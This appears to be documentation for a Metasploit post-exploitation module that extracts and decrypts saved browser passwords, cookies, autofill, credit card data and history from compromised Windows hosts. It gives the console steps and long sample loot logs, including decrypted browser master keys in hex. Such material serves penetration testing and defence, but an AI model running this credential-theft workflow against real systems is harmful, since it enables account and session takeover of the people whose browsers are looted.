
# Vulnerable Application

This post-exploitation module extracts saved user data from various Chromium-based and Gecko-based browsers and decrypts sensitive information, such as passwords and cookies. The module can also extract history & bookmarks. Chromium encrypts sensitive data (e.g., passwords and cookies) using Windows Data Protection API (DPAPI), which can only be decrypted with the **same** logon credentials. This module uses the current user's credentials to decrypt the sensitive data unless specified otherwise.

## Supported Browsers

### Chromium-Based Browsers
- Microsoft Edge
- Google Chrome
- Opera
- Iridium
- Brave
- CentBrowser
- Chedot
- Orbitum
- Comodo Dragon
- Yandex Browser
- 7Star
- Torch
- ChromePlus
- Komet
- Amigo
- Sputnik
- Citrio
- 360Chrome
- Uran
- Liebao
- Elements Browser
- Epic Privacy Browser
- CocCoc Browser
- Sleipnir
- QIP Surf
- Coowon
- Vivaldi

#### Extracted Data

- Login Data (username/passwords, decrypted)
- Cookies (decrypted)
- Browsing History
- Keyword Search History
- Download History
- Autofill Data
- Credit Card Information
- Bookmarks

### Gecko-Based Browsers
- Mozilla Firefox
- Thunderbird
- SeaMonkey
- BlackHawk
- Cyberfox
- K-Meleon
- Icecat
- Pale Moon
- Comodo IceDragon
- Waterfox
- Postbox
- Flock Browser

#### Extracted Data

- Login Data (username/passwords)
- Cookies
- Browsing History
- Keyword Search History
- Download History
- Bookmarks

## Verification Steps

1. Start `msfconsole`.
2. Obtain a meterpreter session on the target system.
3. Run the module: `use post/windows/gather/enum_browsers`
4. Set the appropriate session ID: `set SESSION <session id>`
5. (Optional) Enable verbose mode if you want detailed output: `set VERBOSE true`
6. (Optional) Kill browser processes before extraction to avoid file access issues: `set KILL_BROWSER true`
7. Run the module: `run`
8. You should see the extracted browser data in the loot files.

## Options

- **KILL_BROWSER** - Kills browser processes before data extraction. This can help avoid file access issues if the browser is running, particularly for cookies. Default is `false`.
- **VERBOSE** - Prints more detailed output for each step, including encryption key extraction and DPAPI decryption. Default is `false`.
- **SESSION** - The session to run the module on. Required.

## Extracted Data

The module extracts the following data from supported browsers:

- **Login data** (username/passwords)
- **Cookies** (decrypted)
- **History** (URLs, titles, visit counts, last visit times)
- **Bookmarks**

The data is saved into separate loot files for each browser and data type, with filenames that include the extraction date, browser name, and data type for clarity.

## Example Output

### Normal Session

```bash
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (178.238.175.xxx).
[*] Starting data extraction from user profile: C:\Users\ah
[*] Found Microsoft Edge
[+] └ Extracted Passwords to /root/.msf4/loot/20240926185331_default_192.168.0.25_MicrosoftEdge_P_230673.txt (429 bytes)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Extracted Download history to /root/.msf4/loot/20240926185333_default_192.168.0.25_MicrosoftEdge_D_699561.txt (478 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20240926185334_default_192.168.0.25_MicrosoftEdge_A_516446.txt (1096 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926185334_default_192.168.0.25_MicrosoftEdge_K_772896.txt (26 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926185335_default_192.168.0.25_MicrosoftEdge_B_649049.txt (1722 bytes)
[*] Found Google Chrome
[+] └ Extracted Passwords to /root/.msf4/loot/20240926185337_default_192.168.0.25_GoogleChrome_Pa_776736.txt (281 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240926185338_default_192.168.0.25_GoogleChrome_Co_956705.txt (5470 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20240926185340_default_192.168.0.25_GoogleChrome_Au_865746.txt (359 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926185340_default_192.168.0.25_GoogleChrome_Ke_342861.txt (28 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926185341_default_192.168.0.25_GoogleChrome_Br_568412.txt (9311 bytes)
[*] Found Brave
[+] └ Extracted Passwords to /root/.msf4/loot/20240926185343_default_192.168.0.25_Brave_Passwords_757722.txt (73389 bytes)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Extracted Download history to /root/.msf4/loot/20240926185404_default_192.168.0.25_Brave_DownloadH_000715.txt (4175 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20240926185405_default_192.168.0.25_Brave_AutofillD_855015.txt (60529 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926185426_default_192.168.0.25_Brave_KeywordSe_393133.txt (19000 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926185447_default_192.168.0.25_Brave_BrowsingH_312253.txt (1471523 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240926185447_default_192.168.0.25_Brave_Bookmarks_029305.txt (8601 bytes)
[*] Found Mozilla Firefox
[+] └ Extracted Cookies to /root/.msf4/loot/20240926185450_default_192.168.0.25_MozillaFirefox__229342.txt (3900 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20240926185454_default_192.168.0.25_MozillaFirefox__367136.txt (168 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926185454_default_192.168.0.25_MozillaFirefox__466890.txt (44 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926185458_default_192.168.0.25_MozillaFirefox__674163.txt (6568 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240926185502_default_192.168.0.25_MozillaFirefox__609523.txt (7053 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926185505_default_192.168.0.25_MozillaFirefox__931668.txt (5671 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240926185507_default_192.168.0.25_MozillaFirefox__430936.txt (7053 bytes)
[*] Found Thunderbird
[+] └ Extracted Passwords to /root/.msf4/loot/20240926185509_default_192.168.0.25_Thunderbird_Pass_583557.json (4052 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240926185509_default_192.168.0.25_Thunderbird_Cook_736031.txt (546 bytes)
[*] Post module execution completed
```

### Using KILL_BROWSER to Resolve File Access Issues

If the browser processes are running, cookies and other files may be locked and inaccessible. Use the `KILL_BROWSER` option to kill browsers before extraction:

```bash
msf6 post(windows/gather/enum_browsers) > set KILL_BROWSER true
KILL_BROWSER => true
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (178.238.175.xxx).
[*] Starting data extraction from user profile: C:\Users\ah
[*] Found Microsoft Edge
[+] └ Extracted Passwords to /root/.msf4/loot/20240926190208_default_192.168.0.25_MicrosoftEdge_P_632214.txt (429 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240926190209_default_192.168.0.25_MicrosoftEdge_C_706090.txt (3818 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20240926190211_default_192.168.0.25_MicrosoftEdge_D_598335.txt (478 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20240926190211_default_192.168.0.25_MicrosoftEdge_A_702372.txt (1096 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926190212_default_192.168.0.25_MicrosoftEdge_K_432987.txt (26 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926190213_default_192.168.0.25_MicrosoftEdge_B_812367.txt (1722 bytes)
[*] Found Google Chrome
[+] └ Extracted Passwords to /root/.msf4/loot/20240926190220_default_192.168.0.25_GoogleChrome_Pa_332266.txt (281 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240926190221_default_192.168.0.25_GoogleChrome_Co_694795.txt (5470 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20240926190223_default_192.168.0.25_GoogleChrome_Au_465914.txt (359 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926190224_default_192.168.0.25_GoogleChrome_Ke_500725.txt (28 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926190224_default_192.168.0.25_GoogleChrome_Br_786031.txt (9311 bytes)
[*] Found Brave
[+] └ Extracted Passwords to /root/.msf4/loot/20240926190233_default_192.168.0.25_Brave_Passwords_999052.txt (73389 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240926190234_default_192.168.0.25_Brave_Cookies_392772.txt (225283 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20240926190256_default_192.168.0.25_Brave_DownloadH_464721.txt (4175 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20240926190257_default_192.168.0.25_Brave_AutofillD_903721.txt (60529 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926190317_default_192.168.0.25_Brave_KeywordSe_943675.txt (18485 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926190337_default_192.168.0.25_Brave_BrowsingH_255011.txt (1438126 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240926190338_default_192.168.0.25_Brave_Bookmarks_878553.txt (8601 bytes)
[*] Found Mozilla Firefox
[+] └ Extracted Cookies to /root/.msf4/loot/20240926190340_default_192.168.0.25_MozillaFirefox__859574.txt (3900 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20240926190344_default_192.168.0.25_MozillaFirefox__744177.txt (168 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926190344_default_192.168.0.25_MozillaFirefox__967515.txt (44 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926190348_default_192.168.0.25_MozillaFirefox__212279.txt (6568 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240926190352_default_192.168.0.25_MozillaFirefox__677324.txt (7053 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926190355_default_192.168.0.25_MozillaFirefox__022859.txt (5671 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240926190356_default_192.168.0.25_MozillaFirefox__360103.txt (7053 bytes)
[*] Found Thunderbird
[+] └ Extracted Passwords to /root/.msf4/loot/20240926190358_default_192.168.0.25_Thunderbird_Pass_465900.json (4052 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240926190359_default_192.168.0.25_Thunderbird_Cook_985682.txt (546 bytes)
[*] Post module execution completed
```

This will kill any running browser processes and avoid file access issues.

### Using VERBOSE Mode for Detailed Output

If you want to see each step of the extraction and decryption process, enable verbose mode:

```bash
msf6 post(windows/gather/enum_browsers) > set VERBOSE true
VERBOSE => true
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (178.238.175.xxx).
[*] Starting data extraction from user profile: C:\Users\ah
[*] Found Microsoft Edge
[*] Getting encryption key from: C:\Users\ah\AppData\Local\Microsoft\Edge\\User Data\Local State
[*] Encrypted key (Base64-decoded, hex): 01000000d08c9ddf0115d1118c7a00c04fc297eb010000001360fe6518ad1d418ddb36d19cea4821100000001e0000004d006900630072006f0073006f00660074002000450064006700650000001066000000010000200000008a876b35ed1a81258c62e3baf7358d2cde10f538d6b20642b0b55873b3aaf9a6000000000e8000000002000020000000160f1c772a381a30045d38466df97d211ccd41dba6a8ae12f5782579752bb50c300000000da6ad4cb58b76db77358cf97724380cdc44f5f3f725c88d0df86c5d67a3a2cb1cbfeb71662480691b2b22e4654c44eb400000005be9574af5e724c4efb41cdcb68aecedb516eb11707514847bcae347ffbf1cea77e5f5ea7d99bfeaefd16d3876438259244e18ce7191c16cc3a74efee0391b58
[*] Starting DPAPI decryption process.
[+] Decryption successful.
[-] Decrypted key is not 32 bytes: 31 bytes
[*] Decrypted key is 31 bytes, attempting to pad key for decryption.
[+] Decrypted key (hex): 6f11fdf3cc97b3923b5363093e57e26612e998cbf4e6ba042f0b9856fa3f1800
[+] └ Extracted Passwords to /root/.msf4/loot/20240926190448_default_192.168.0.25_MicrosoftEdge_P_199898.txt (429 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240926190449_default_192.168.0.25_MicrosoftEdge_C_987016.txt (3818 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20240926190450_default_192.168.0.25_MicrosoftEdge_D_492870.txt (478 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20240926190451_default_192.168.0.25_MicrosoftEdge_A_584390.txt (1096 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20240926190452_default_192.168.0.25_MicrosoftEdge_K_730737.txt (26 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20240926190453_default_192.168.0.25_MicrosoftEdge_B_012136.txt (1722 bytes)
[*] Found Google Chrome
[*] Getting encryption key from: C:\Users\ah\AppData\Local\Google\Chrome\\User Data\Local State
[*] Encrypted key (Base64-decoded, hex): 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f7481e30d117ce48960717a9d8c48ce9100000001c00000047006f006f0067006c00650020004300680072006f006d0065000000106600000001000020000000b40e0279cb6a2591328449ad8f82a188003194b30b037734ff1930ecc484437f000000000e80000000020000200000006c3409f54f2a424ec97033d405f66f7f4af71ace770e953593987ba88196d39030000000269710a8b9504c88046418d04669d6960d9dba46defe8242c9ba44bea3120493f30e384c0f60e02628386251c31974b34000000071d383a75cd982d4683538f98e9947cf550afa9e9d5f83ad46dc5f8d2c0a75e1569c40461ec6728455eb8508341ba6b35cda5cdd7220d01c725c09cde9421955
[*] Starting DPAPI decryption process.
[+] Decryption successful.
[+] Decrypted key (hex): bce3947bb5e5349c9d21d0ca3d9dd29a5e5cfa1b884c1f599e95078e88eb7419
[+] └ Extracted Passwords to /root/.msf4/loot/20240926190455_default_192.168.0.25_GoogleChrome_Pa_111298.txt (281 bytes)
[*] App-Bound encryption detected (v20). Skipping decryption for this entry.
[+] └ Extracted Cookies to /root/.msf4/loot/20240926190455_default_192.168.0.25_GoogleChrome_Co_276515.txt (5470 bytes)
...
```
This will show detailed information, such as:

- The extraction of encryption keys from local state files.
- The decryption of data using DPAPI.
- Success or failure messages for each extraction step.

## Potential Errors

- **Cookies file in use**: If the cookies database is locked by the browser, you may encounter an error message similar to:

  ```bash
  [-] Cannot access Cookies. File in use by another process.
  ```

  You can resolve this by setting `KILL_BROWSER` to `true`.
